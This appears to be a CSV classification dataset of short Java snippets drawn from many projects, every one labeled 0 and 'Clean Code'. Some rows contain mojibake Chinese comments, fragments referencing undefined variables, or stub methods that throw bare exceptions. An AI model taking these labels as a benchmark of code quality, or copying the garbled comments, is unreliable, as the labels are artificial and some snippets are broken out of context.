text,label,text_label
"/** 
 * Set the node above this one in the k-d tree.
 * @param node The node being added to the tree.
 */
void setAbove(DimensionNode node){
  if (node == null) {
    this.above=null;
  }
 else   if ((this.dimension + 1 == node.dimension) || (this.dimension == maxD && node.dimension == 0)) {
    this.above=node;
  }
 else {
    throw new IllegalArgumentException(""Setting the above/right node failed because the dimensions are incorrect."");
  }
}",0,Clean Code
"/** 
 * Used by the OLCUT configuration system, and should not be called by external code.
 */
@Override public void postConfig() throws IOException {
  if (maxFeatureID != Integer.MIN_VALUE) {
    rangeSet=true;
    minFeatureID=zeroIndexed ? 0 : 1;
    if (maxFeatureID < minFeatureID + 1) {
      throw new IllegalArgumentException(""maxFeatureID must be positive, found "" + maxFeatureID);
    }
  }
  if ((url == null) && (path == null)) {
    throw new PropertyException("""",""path"",""At most one of url and path must be set."");
  }
 else   if ((url != null) && (path != null) && !path.toUri().toURL().equals(url)) {
    throw new PropertyException("""",""path"",""At most one of url and path must be set"");
  }
 else   if (path != null) {
    try {
      url=path.toUri().toURL();
    }
 catch (    MalformedURLException e) {
      throw new PropertyException(e,"""",""path"",""Path was not a valid URL"");
    }
  }
  read();
}",0,Clean Code
"@Override public boolean onHover(View v,MotionEvent event){
  if (mPopup != null && mFromTouch) {
    return false;
  }
  AccessibilityManager manager=(AccessibilityManager)mAnchor.getContext().getSystemService(Context.ACCESSIBILITY_SERVICE);
  if (manager.isEnabled() && manager.isTouchExplorationEnabled()) {
    return false;
  }
switch (event.getAction()) {
case MotionEvent.ACTION_HOVER_MOVE:
    if (mAnchor.isEnabled() && mPopup == null && updateAnchorPos(event)) {
      setPendingHandler(this);
    }
  break;
case MotionEvent.ACTION_HOVER_EXIT:
clearAnchorPos();
hide();
break;
}
return false;
}
",0,Clean Code
"public Delta build(){
  return new Delta(this);
}
",0,Clean Code
"public RunIterationsNode(VmLanguage language,FrameDescriptor descriptor,ExpressionNode iterationNode){
  super(language,descriptor);
  this.blackholeNode=BlackholeNodeGen.create(iterationNode);
}
",0,Clean Code
"@Test public void testSetrange(){
  jedisSentinel.setrange(""key"",1337,""value"");
}",0,Clean Code
"public Builder retrievalAugmentor(RetrievalAugmentor retrievalAugmentor){
  this.retrievalAugmentor=retrievalAugmentor;
  return this;
}
",0,Clean Code
"public GProRolePermissionDesc(){
  this.title="""";
  this.desc="""";
}
public GProRolePermissionDesc(int i2,String str,String str2){
  this.title="""";
  this.desc="""";
  this.rootId=i2;
  this.title=str;
  this.desc=str2;
}",0,Clean Code
"@Override public void writeExternal(ObjectOutput out) throws IOException {
  throw new RuntimeException();
}
",0,Clean Code
"/** 
 * Runs a comparison between an onnx model and a Tribuo model. <p> Only runs on x86 platforms.
 * @param model The Tribuo model.
 * @param onnxFile The path on disk to the ONNX model.
 * @param testSet The test set.
 * @param delta The delta allowable between the Tribuo and ORT predictions.
 * @throws OrtException If ORT failed to initialize.
 */
public static void onnxLabelComparison(Model<Label> model,Path onnxFile,Dataset<Label> testSet,double delta) throws OrtException {
  Map<String,Integer> featureMapping=new HashMap<>();
  for (  VariableInfo f : model.getFeatureIDMap()) {
    VariableIDInfo id=(VariableIDInfo)f;
    featureMapping.put(id.getName(),id.getID());
  }
  Map<Label,Integer> outputMapping=new HashMap<>();
  for (  Pair<Integer,Label> l : model.getOutputIDInfo()) {
    outputMapping.put(l.getB(),l.getA());
  }
  String arch=System.getProperty(""os.arch"");
  String os=System.getProperty(""os.name"").toLowerCase(Locale.ENGLISH);
  if (arch.equalsIgnoreCase(""amd64"") || arch.equalsIgnoreCase(""x86_64"") || (arch.equalsIgnoreCase(""aarch64"") && (os.contains(""mac"") || os.contains(""nux"")))) {
    OrtEnvironment env=OrtEnvironment.getEnvironment();
    env.close();
    ONNXExternalModel<Label> onnxModel=ONNXExternalModel.createOnnxModel(new LabelFactory(),featureMapping,outputMapping,new DenseTransformer(),new LabelTransformer(),new OrtSession.SessionOptions(),onnxFile,""input"");
    List<Prediction<Label>> nativePredictions=model.predict(testSet);
    List<Prediction<Label>> onnxPredictions=onnxModel.predict(testSet);
    for (int i=0; i < nativePredictions.size(); i++) {
      Prediction<Label> tribuo=nativePredictions.get(i);
      Prediction<Label> external=onnxPredictions.get(i);
      assertEquals(tribuo.getOutput().getLabel(),external.getOutput().getLabel());
      assertEquals(tribuo.getOutput().getScore(),external.getOutput().getScore(),delta);
      for (      Map.Entry<String,Label> l : tribuo.getOutputScores().entrySet()) {
        Label other=external.getOutputScores().get(l.getKey());
        if (other == null) {
          fail(""Failed to find label "" + l.getKey() + "" in ORT prediction."");
        }
 else {
          assertEquals(l.getValue().getScore(),other.getScore(),delta);
        }
      }
    }
    ModelProvenance modelProv=model.getProvenance();
    Optional<ModelProvenance> optProv=onnxModel.getTribuoProvenance();
    assertTrue(optProv.isPresent());
    ModelProvenance onnxProv=optProv.get();
    assertNotSame(onnxProv,modelProv);
    assertEquals(modelProv,onnxProv);
    onnxModel.close();
  }
 else {
    logger.warning(""ORT based tests only supported on x86_64, found "" + arch);
  }
}",0,Clean Code
"public String getDesc(){
  return this.mInfo.getDesc();
}
",0,Clean Code
"public static ActivateFarmElementCsReq parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new ActivateFarmElementCsReq(),data).checkInitialized();
}
public static ActivateFarmElementCsReq parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ActivateFarmElementCsReq(),input).checkInitialized();
}
public static ActivateFarmElementCsReq parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new ActivateFarmElementCsReq(),input).checkInitialized();
}
",0,Clean Code
"/** 
 * <code>optional uint32 cur_site_id = 11;</code>
 * @return this
 */
public RogueMapInfo clearCurSiteId(){
  bitField0_&=~0x00000004;
  curSiteId=0;
  return this;
}",0,Clean Code
"@GET(""models"") @Headers({""Content-Type: application/json""}) Call<MistralAiModelResponse> models();
",0,Clean Code
"/** 
 * <code>optional uint32 relic_id = 11;</code>
 * @return this
 */
public RelicArchive clearRelicId(){
  bitField0_&=~0x00000001;
  relicId=0;
  return this;
}",0,Clean Code
"@Override public void tail(@NonNull Node node,int depth){
  if (node instanceof Element) {
    if (""span"".equals(el.nodeName()) && el.hasClass(""ellipsis"")) {
      ssb.append(""鈥�"",new DeleteWhenCopiedSpan(),Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
    }
 else     if (""p"".equals(el.nodeName())) {
      if (node.nextSibling() != null)       ssb.append(""\n\n"");
    }
 else     if (!openSpans.isEmpty()) {
      SpanInfo si=openSpans.get(openSpans.size() - 1);
      if (si.element == el) {
        ssb.setSpan(si.span,si.start,ssb.length(),Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
        openSpans.remove(openSpans.size() - 1);
      }
    }
  }
}
@Override public void tail(Node node,int depth){
  if (node instanceof Element && ""p"".equals(el.tagName()) && el.nextSibling() != null) {
    sb.append(""\n\n"");
  }
}",0,Clean Code
"/** 
 * 鍒楄〃
 */
@RequestMapping(value=""/categories"",method=RequestMethod.GET) @ApiOperation(value=""鍟嗗搧鍒嗙被鍒楄〃"",notes=""鏍规嵁绾у埆鍜屼笂绾у垎绫籭d鏌ヨ"") public Result list(@RequestParam(required=false) @ApiParam(value=""椤电爜"") Integer pageNumber,@RequestParam(required=false) @ApiParam(value=""姣忛〉鏉℃暟"") Integer pageSize,@RequestParam(required=false) @ApiParam(value=""鍒嗙被绾у埆"") Integer categoryLevel,@RequestParam(required=false) @ApiParam(value=""涓婄骇鍒嗙被鐨刬d"") Long parentId,@TokenToAdminUser AdminUserToken adminUser){
  logger.info(""adminUser:{}"",adminUser.toString());
  if (pageNumber == null || pageNumber < 1 || pageSize == null || pageSize < 10 || categoryLevel == null || categoryLevel < 0 || categoryLevel > 3 || parentId == null || parentId < 0) {
    return ResultGenerator.genFailResult(""鍒嗛〉鍙傛暟寮傚父锛"");
  }
  Map params=new HashMap(8);
  params.put(""page"",pageNumber);
  params.put(""limit"",pageSize);
  params.put(""categoryLevel"",categoryLevel);
  params.put(""parentId"",parentId);
  PageQueryUtil pageUtil=new PageQueryUtil(params);
  return ResultGenerator.genSuccessResult(newBeeMallCategoryService.getCategorisPage(pageUtil));
}",0,Clean Code
"@ParameterizedTest @ValueSource(strings={""{\""arg0\"": 2, \""arg1\"": 2}"",""{\""arg0\"": 2.0, \""arg1\"": 2.0}"",""{\""arg0\"": 1.9, \""arg1\"": 2.1}""}) void should_execute_tool_with_parameters_of_type_double(String arguments) throws NoSuchMethodException {
  executeAndAssert(arguments,""doubles"",double.class,Double.class,""4.0"");
}",0,Clean Code
"@Override public Row buildRow(Row reuse,String mandatoryEncoding) throws BitSailException {
  if (this.getDelimiter() != null && this.getDelimiter().length == 1 && this.getDelimiter()[0] == NEW_LINE && currOffset + currLen >= 1 && currBuffer[currOffset + currLen - 1] == CARRIAGE_RETURN) {
    currLen-=1;
  }
  try {
    reuse=bytesParser.parse(reuse,currBuffer,currOffset,currLen,charsetName,rowTypeInfo);
  }
 catch (  Exception e) {
    LOG.error(""Parse one line error!"",e);
    throw BitSailException.asBitSailException(TextInputFormatErrorCode.ILLEGAL_JSON,e);
  }
  return reuse;
}",0,Clean Code
"public CooperateUser(String i,String n){
  id=i;
  name=n;
}
",0,Clean Code
"private void save() throws IOException {
  final BinDiffConfig config=BinDiffConfig.getInstance();
  final GraphViewSettingsConfigItem settings=config.getInitialFlowGraphSettings();
  settings.setDefaultGraphLayout(layoutingPanel.getDefaultLayout());
  settings.setAutoLayouting(layoutingPanel.getAutoLayouting());
  settings.setProximityBrowsing(proximityBrowsingPanel.getProximityBrowsing());
  settings.setAutoProximityBrowsingActivationThreshold(proximityBrowsingPanel.getAutoProximityBrowsingActivationThreshold());
  settings.setProximityBrowsingChildDepth(proximityBrowsingPanel.getProximityBrowsingChildDepth());
  settings.setProximityBrowsingParentDepth(proximityBrowsingPanel.getProximityBrowsingParentDepth());
  settings.setDrawBends(edgesPanel.getDrawBends());
  settings.setHierarchicalOrthogonalEdgeRouting(hierarchicalLayoutPanel.getOrthogonalEdgeRouting());
  settings.setHierarchicalOrientation(hierarchicalLayoutPanel.getLayoutOrientation());
  settings.setHierarchicalMinimumLayerDistance(hierarchicalLayoutPanel.getMinimumLayerDistance());
  settings.setHierarchicalMinimumNodeDistance(hierarchicalLayoutPanel.getMinimumNodeDistance());
  settings.setOrthogonalLayoutStyle(orthogonalLayoutPanel.getOrthogonalLayoutStyle());
  settings.setOrthogonalOrientation(orthogonalLayoutPanel.getOrthogonalOrientation());
  settings.setOrthogonalMinimumNodeDistance(orthogonalLayoutPanel.getMinimumNodeDistance());
  settings.setCircularLayoutStyle(circularLayoutPanel.getCircularLayoutStyle());
  settings.setCircularMinimumNodeDistance(circularLayoutPanel.getMinimumNodeDistance());
  settings.setShowScrollbars(controlsPanel.getShowScrollbars());
  settings.setMouseWheelAction(controlsPanel.getMouseWheelBehavior());
  settings.setZoomSensitivity(controlsPanel.getZoomSensitivity());
  settings.setScrollSensitivity(controlsPanel.getScrollSensitivity());
  settings.setViewSynchronization(miscPanel.getViewSynchronization());
  settings.setAnimationSpeed(miscPanel.getAnimationSpeed());
  config.write();
}
",0,Clean Code
"public InlineTaskMapper(ParametersUtils parametersUtils,MetadataDAO metadataDAO){
  this.parametersUtils=parametersUtils;
  this.metadataDAO=metadataDAO;
}
",0,Clean Code
"@Override public void postConfig(){
  boolean bothFieldNamesPopulated=fieldName != null && fieldNames != null;
  boolean neitherFieldNamesPopulated=fieldName == null && fieldNames == null;
  boolean multipleFieldNamesPopulated=fieldNames != null;
  boolean singleFieldNamePopulated=fieldName != null;
  boolean bothDefaultValuesPopulated=defaultValues != null && defaultValue != null;
  boolean neitherDefaultValuesPopulated=defaultValue == null && defaultValues == null;
  boolean multipleDefaultValuesPopulated=defaultValues != null;
  boolean singleDefaultValuePopulated=defaultValue != null;
  if (bothFieldNamesPopulated || neitherFieldNamesPopulated) {
    throw new PropertyException(configName,""fieldName, FieldNames"",""exactly one of fieldName or fieldNames must be populated"");
  }
 else   if (bothDefaultValuesPopulated || neitherDefaultValuesPopulated) {
    throw new PropertyException(configName,""defaultValue, defaultValues"",""exactly one of defaultValue or defaultValues must be populated"");
  }
 else   if (multipleFieldNamesPopulated && multipleDefaultValuesPopulated && fieldNames.size() != defaultValues.size()) {
    throw new PropertyException(configName,""defaultValues"",""must match the length of fieldNames"");
  }
 else   if (multipleFieldNamesPopulated && singleDefaultValuePopulated) {
    defaultValues=Collections.nCopies(fieldNames.size(),defaultValue);
    defaultValue=null;
  }
 else   if (singleFieldNamePopulated && multipleDefaultValuesPopulated) {
    throw new PropertyException(configName,""defaultValues"",""if fieldName is populated, defaultValues must be blank"");
  }
 else   if (singleFieldNamePopulated && singleDefaultValuePopulated) {
    fieldNames=Collections.singletonList(fieldName);
    fieldName=null;
    defaultValues=Collections.singletonList(defaultValue);
    defaultValue=null;
  }
}
",0,Clean Code
"/** 
 * 鍒嗛〉鏌ヨ鎵撳嵃妯℃澘鍒楄〃
 * @param templateBO search
 * @return data
 */
BasePage<ModulePrintTemplate> queryPrintTemplateList(Long moduleId,Integer version,PageEntity templateBO);
",0,Clean Code
"public int getStreamType(){
  return this.mInfo.getStreamType();
}
",0,Clean Code
"@Override public Long calculateNextTriggerTime(Long preTriggerTime,String timeExpression,Long startTime,Long endTime){
  Cron cron=cronParser.parse(timeExpression);
  ExecutionTime executionTime=ExecutionTime.forCron(cron);
  if (startTime != null && startTime > System.currentTimeMillis() && preTriggerTime < startTime) {
    Optional<ZonedDateTime> zonedDateTime=executionTime.lastExecution(ZonedDateTime.ofInstant(Instant.ofEpochMilli(startTime),ZoneId.systemDefault()));
    preTriggerTime=zonedDateTime.map(dateTime -> dateTime.toEpochSecond() * 1000).orElse(startTime);
  }
  Instant instant=Instant.ofEpochMilli(preTriggerTime);
  ZonedDateTime preZonedDateTime=ZonedDateTime.ofInstant(instant,ZoneId.systemDefault());
  Optional<ZonedDateTime> opt=executionTime.nextExecution(preZonedDateTime);
  if (opt.isPresent()) {
    long nextTriggerTime=opt.get().toEpochSecond() * 1000;
    if (endTime != null && endTime < nextTriggerTime) {
      return null;
    }
    return nextTriggerTime;
  }
  return null;
}",0,Clean Code
"/** 
 * NOTE: Pos gathered from content block data may slightly exceed video duration (e.g. 302200 when duration is 302000).
 */
@Override public void setPositionMs(long positionMs){
  if (mPlayer != null && positionMs >= 0 && positionMs <= getDurationMs()) {
    mPlayer.seekTo(positionMs);
  }
}",0,Clean Code
"/** 
 * For olcut.
 */
private ImageConverter(){
}
/** 
 * Builds an image converter for images of the supplied size.
 * @param inputName The input name.
 * @param width The image width.
 * @param height The image height.
 * @param channels The number of colour channels.
 */
public ImageConverter(String inputName,int width,int height,int channels){
  if (width < 1 || height < 1 || channels < 1) {
    throw new IllegalArgumentException(""Inputs must be positive integers, found ["" + width + "",""+ height+ "",""+ channels+ ""]"");
  }
  if (inputName == null || inputName.isEmpty()) {
    throw new IllegalArgumentException(""The input name must be a valid String"");
  }
  long values=((long)width) * height * channels;
  if (values > Integer.MAX_VALUE) {
    throw new IllegalArgumentException(""Image size must be less than 2^31, found "" + values);
  }
  this.inputName=inputName;
  this.totalPixels=(int)values;
  this.width=width;
  this.height=height;
  this.channels=channels;
}",0,Clean Code
"/** 
 * @return a converter that maps between this enum's numeric and text representations
 */
public static ProtoEnum.EnumConverter<BattleEndReason> converter(){
  return BattleEndReasonConverter.INSTANCE;
}
",0,Clean Code
"@Override public int hashCode(){
  return Objects.hash(fieldName);
}
",0,Clean Code
"public b e(String str){
  this.f227614c=str;
  return this;
}",0,Clean Code
"/** 
 * Creates a resolved module key backed by the given URL. The resulting module will be loaded from that URL and cached using the given URI as cache key.
 */
public static ResolvedModuleKey url(ModuleKey original,URI uri,URL url){
  return new Url(original,uri,url);
}
Url(ModuleKey original,URI uri,URL url){
  this.original=original;
  this.uri=uri;
  this.url=url;
}
",0,Clean Code
"public AppController addWalletTabOrWindow(Storage storage,Wallet wallet,boolean forceSameWindow){
  Window existingWalletWindow=AppServices.get().getWindowForWallet(storage.getWalletId(wallet));
  if (existingWalletWindow instanceof Stage) {
    Stage existingWalletStage=(Stage)existingWalletWindow;
    existingWalletStage.toFront();
    EventManager.get().post(new ViewWalletEvent(existingWalletWindow,wallet,storage));
    return this;
  }
  if (!forceSameWindow && Config.get().isOpenWalletsInNewWindows() && !getOpenWallets().isEmpty()) {
    Stage stage=new Stage();
    AppController appController=AppServices.newAppWindow(stage);
    stage.toFront();
    stage.setX(AppServices.get().getWalletWindowMaxX() + 30);
    appController.addWalletTab(storage,wallet);
    return appController;
  }
 else {
    addWalletTab(storage,wallet);
    return this;
  }
}",0,Clean Code
"private ListResult<ExecuteResult> reBuildHeader(List<ExecuteResult> results,String schemaName,String databaseName){
  ListResult<ExecuteResult> listResult=ListResult.of(results);
  for (  ExecuteResult executeResult : results) {
    List<Header> headers=executeResult.getHeaderList();
    if (executeResult.getSuccess() && executeResult.isCanEdit() && CollectionUtils.isNotEmpty(headers)) {
      headers=setColumnInfo(headers,executeResult.getTableName(),schemaName,databaseName);
      executeResult.setHeaderList(headers);
    }
    if (!executeResult.getSuccess()) {
      listResult.setSuccess(false);
      listResult.errorCode(executeResult.getDescription());
      listResult.setErrorMessage(executeResult.getMessage());
    }
    addOperationLog(executeResult);
  }
  return listResult;
}
",0,Clean Code
"/** 
 * 鏄惁鏄暟瀛楁垨鑰呯壒娈婂瓧绗�
 * @param lastIndexNamePart
 * @return
 */
public static boolean isNumbericOrSpecialChar(String lastIndexNamePart){
  for (int i=0; i < lastIndexNamePart.length(); ++i) {
    char c=lastIndexNamePart.charAt(i);
    if (Character.isDigit(c) || c == '-' || c == '_') {
      continue;
    }
 else {
      return false;
    }
  }
  return true;
}",0,Clean Code
"private void setType(int type){
  selectedTextType=type;
  if (currentEntityView instanceof TextPaintView) {
    Swatch currentSwatch=colorPicker.getSwatch();
    if (type == 0 && currentSwatch.color == Color.WHITE) {
      Swatch blackSwatch=new Swatch(Color.BLACK,0.85f,currentSwatch.brushWeight);
      setCurrentSwatch(blackSwatch,true);
    }
 else     if ((type == 1 || type == 2) && currentSwatch.color == Color.BLACK) {
      Swatch blackSwatch=new Swatch(Color.WHITE,1.0f,currentSwatch.brushWeight);
      setCurrentSwatch(blackSwatch,true);
    }
    ((TextPaintView)currentEntityView).setType(type);
  }
}",0,Clean Code
"@Override public void scrollToPosition(int position){
  mPositionBeforeScroll=getCurrentPosition();
  mSmoothScrollTargetPosition=position;
  super.scrollToPosition(position);
  if (mSmoothScrollTargetPosition >= 0 && mSmoothScrollTargetPosition < getItemCount() && mSmoothScrollTargetPosition != mPositionBeforeScroll && mOnPageChangedListener != null) {
    getViewTreeObserver().addOnGlobalLayoutListener(mGlobalLayoutListener);
  }
}",0,Clean Code
"/** 
 * private method 
 */
private void collectMetrics(Long clusterPhyId,String topicName,Map<Integer,PartitionMetrics> metricsMap,List<VersionControlItem> items){
  Set<String> collectedMetricsNameSet=new HashSet<>();
  for (  VersionControlItem v : items) {
    try {
      if (collectedMetricsNameSet.contains(v.getName())) {
        continue;
      }
      collectedMetricsNameSet.add(v.getName());
      Result<List<PartitionMetrics>> ret=partitionMetricService.collectPartitionsMetricsFromKafkaWithCache(clusterPhyId,topicName,v.getName());
      if (null == ret || ret.failed() || null == ret.getData() || ret.getData().isEmpty()) {
        continue;
      }
      collectedMetricsNameSet.addAll(ret.getData().get(0).getMetrics().keySet());
      for (      PartitionMetrics subMetrics : ret.getData()) {
        metricsMap.putIfAbsent(subMetrics.getPartitionId(),subMetrics);
        PartitionMetrics allMetrics=metricsMap.get(subMetrics.getPartitionId());
        allMetrics.putMetric(subMetrics.getMetrics());
      }
    }
 catch (    Exception e) {
      LOGGER.info(""method=collectMetrics||clusterPhyId={}||topicName={}||metricName={}||errMsg=exception"",clusterPhyId,topicName,v.getName(),e);
    }
  }
}",0,Clean Code
"@SuppressWarnings(""TryWithIdenticalCatches"") public static void registerOnActivityDestroyListener(Preference preference,PreferenceManager.OnActivityDestroyListener listener){
  if (null == mRegisterOnActivityDestroyListener || null == preference || null == listener) {
    return;
  }
  PreferenceManager preferenceManager=preference.getPreferenceManager();
  if (null == preferenceManager) {
    return;
  }
  try {
    mRegisterOnActivityDestroyListener.invoke(preferenceManager,listener);
  }
 catch (  IllegalAccessException e) {
    e.printStackTrace();
  }
catch (  InvocationTargetException e) {
    e.printStackTrace();
  }
}
",0,Clean Code
"private static void addInheritedClassFields(J.ClassDeclaration classDeclaration,@Nullable JavaType.FullyQualified superClass,Set<String> names){
  if (superClass != null) {
    boolean isSamePackage=classDeclaration.getType() != null && classDeclaration.getType().getPackageName().equals(superClass.getPackageName());
    superClass.getMembers().forEach(m -> {
      if ((Flag.hasFlags(m.getFlagsBitMap(),Flag.Public) || Flag.hasFlags(m.getFlagsBitMap(),Flag.Protected)) || !Flag.hasFlags(m.getFlagsBitMap(),Flag.Private) && isSamePackage) {
        names.add(m.getName());
      }
    }
);
    addInheritedClassFields(classDeclaration,superClass.getSupertype(),names);
  }
}
",0,Clean Code
"@Override public Object read(MemoryBuffer buffer){
  long offset=this.offset;
  if (offset == -1) {
    Preconditions.checkArgument(!GraalvmSupport.isGraalBuildtime());
    offset=this.offset=Platform.UNSAFE.staticFieldOffset(field);
    base=Platform.UNSAFE.staticFieldBase(field);
  }
  return Platform.getObject(base,offset);
}",0,Clean Code
"/** 
 * Return true if a class satisfy following requirements. <li>implements  {@link Serializable}<li>is not an  {@link Enum}<li>is not an array <li>Doesn't have  {@code readResolve}/ {@code writePlace} method<li>has  {@code readObject}/ {@code writeObject} method, but doesn't implements {@link Externalizable}<li/>
 */
public static boolean requireJavaSerialization(Class<?> clz){
  if (clz.isEnum() || clz.isArray()) {
    return false;
  }
  if (ReflectionUtils.isDynamicGeneratedCLass(clz)) {
    return false;
  }
  if (!Serializable.class.isAssignableFrom(clz)) {
    return false;
  }
  if (useReplaceResolveSerializer(clz)) {
    return false;
  }
  if (Externalizable.class.isAssignableFrom(clz)) {
    return false;
  }
 else {
    if (""sun.reflect.annotation.AnnotationInvocationHandler"".equals(clz.getName())) {
      return false;
    }
    return JavaSerializer.getReadObjectMethod(clz) != null || JavaSerializer.getWriteObjectMethod(clz) != null;
  }
}
",0,Clean Code
"@NotNull Flow<ArrayList<ContactMsgBoxInfo>> contactMsgBoxChangedFlow();
",0,Clean Code
"@Override public int hashCode(){
  return editor.hashCode();
}
@Override public int hashCode(){
  return urlScheme.hashCode();
}
",0,Clean Code
"@Override @TruffleBoundary public void describe(StringBuilder builder,String indent){
  describeSummary(builder,indent);
  describeDetails(builder,indent);
}
",0,Clean Code
"public int getExpireTs(){
  return this.expireTs;
}
",0,Clean Code
"/** 
 * <code>repeated .RogueDialogueEventParam rogue_dialogue_event_param = 9;</code>
 * @return whether the rogueDialogueEventParam field is set
 */
public boolean hasRogueDialogueEventParam(){
  return (bitField0_ & 0x00000020) != 0;
}",0,Clean Code
"private Result<ConnectClusterMetrics> getConnectWorkerMetricAvg(VersionItemParam metricParam){
  ConnectClusterMetricParam param=(ConnectClusterMetricParam)metricParam;
  Long connectClusterId=param.getConnectClusterId();
  String metric=param.getMetric();
  Result<List<ConnectWorkerMetrics>> ret=this.getConnectWorkerMetricsByJMX(connectClusterId,metric);
  if (ret == null || !ret.hasData() || ret.getData().isEmpty()) {
    return Result.buildFailure(NOT_EXIST);
  }
  Float value=ret.getData().stream().map(elem -> elem.getMetric(metric) == null ? 0 : elem.getMetric(metric)).reduce(Float::sum).get();
  ConnectClusterMetrics connectClusterMetrics=new ConnectClusterMetrics(null,connectClusterId);
  connectClusterMetrics.putMetric(metric,value / ret.getData().size());
  return Result.buildSuc(connectClusterMetrics);
}",0,Clean Code
"private List<TableIndexColumn> getTableIndexColumn(ResultSet resultSet) throws SQLException {
  List<TableIndexColumn> tableIndexColumns=new ArrayList<>();
  String name=StringUtils.isBlank(resultSet.getString(""column_name"")) ? resultSet.getString(""expression"") : resultSet.getString(""column_name"");
  if (StringUtils.isNotBlank(name)) {
    String[] split=name.split("","");
    for (    String columName : split) {
      TableIndexColumn tableIndexColumn=new TableIndexColumn();
      tableIndexColumn.setColumnName(columName);
      tableIndexColumn.setOrdinalPosition(resultSet.getShort(""seq_in_index""));
      tableIndexColumn.setCollation(resultSet.getString(""collation""));
      tableIndexColumn.setCardinality(resultSet.getLong(""cardinality""));
      tableIndexColumn.setSubPart(resultSet.getLong(""sub_part""));
      tableIndexColumns.add(tableIndexColumn);
    }
  }
  return tableIndexColumns;
}
",0,Clean Code
"/** 
 * <code>optional uint32 attacked_group_id = 8;</code>
 * @return this
 */
public SceneCastSkillCsReq clearAttackedGroupId(){
  bitField0_&=~0x00000004;
  attackedGroupId=0;
  return this;
}",0,Clean Code
"@Override public LockEquipmentCsReq create(){
  return LockEquipmentCsReq.newInstance();
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof ChessRogueCell)) {
    return false;
  }
  ChessRogueCell other=(ChessRogueCell)o;
  return bitField0_ == other.bitField0_ && (!hasEntranceId() || entranceId == other.entranceId) && (!hasNNMNHHPJBDB() || nNMNHHPJBDB == other.nNMNHHPJBDB) && (!hasNLBGDNLIONI() || nLBGDNLIONI == other.nLBGDNLIONI) && (!hasFOKKJJADPEA() || fOKKJJADPEA == other.fOKKJJADPEA) && (!hasPNKFAINKKCE() || pNKFAINKKCE == other.pNKFAINKKCE) && (!hasCellId() || cellId == other.cellId) && (!hasJLOBGDKNJLN() || jLOBGDKNJLN == other.jLOBGDKNJLN) && (!hasNewRoomId() || newRoomId == other.newRoomId) && (!hasPMBLMGDFGAN() || pMBLMGDFGAN == other.pMBLMGDFGAN) && (!hasIsUnlocked() || isUnlocked == other.isUnlocked) && (!hasIIJOCONHKND() || iIJOCONHKND.equals(other.iIJOCONHKND));
}",0,Clean Code
"public void recalculateSizes(){
  for (  Pass pass : passes) {
    if (pass instanceof ComputeOnlyPass) {
      continue;
    }
    int passWidth=0, passHeight=0;
    for (    int buffer : pass.drawBuffers) {
      RenderTarget target=renderTargets.get(buffer);
      if ((passWidth > 0 && passWidth != target.getWidth()) || (passHeight > 0 && passHeight != target.getHeight())) {
        throw new IllegalStateException(""Pass widths must match"");
      }
      passWidth=target.getWidth();
      passHeight=target.getHeight();
    }
    renderTargets.destroyFramebuffer(pass.framebuffer);
    pass.framebuffer=renderTargets.createColorFramebuffer(pass.stageReadsFromAlt,pass.drawBuffers);
    pass.viewWidth=passWidth;
    pass.viewHeight=passHeight;
  }
}",0,Clean Code
"public static int getEndOfHTTPHeaders(byte[] buf){
  for (int i=0; i <= (buf.length - 4); i++) {
    if ((buf[i] == '\r') && (buf[i + 1] == '\n') && (buf[i + 2] == '\r')&& (buf[i + 3] == '\n'))     return i + 4;
  }
  return 0;
}",0,Clean Code
"private static boolean hasFixedSize(int type){
  if (type == TYPE_PIN_DIALOGS || type == TYPE_FOLDERS || type == TYPE_CHATS_IN_FOLDER || type == TYPE_LARGE_FILE || type == TYPE_ACCOUNTS) {
    return true;
  }
  return false;
}
",0,Clean Code
"@Override public void onBackPressed(){
  if (mViewTransition != null && mThumb != null && mViewTransition.getShownViewIndex() == 0 && mThumb.isShown()) {
    int[] location=new int[2];
    mThumb.getLocationInWindow(location);
    if (location[1] + mThumb.getHeight() > 0) {
      setTransitionName();
      finish(new ExitTransaction(mThumb));
      return;
    }
  }
  finish();
}",0,Clean Code
"@Override public void onNext(String token){
  throw new RuntimeException(""Not implemented"");
}
",0,Clean Code
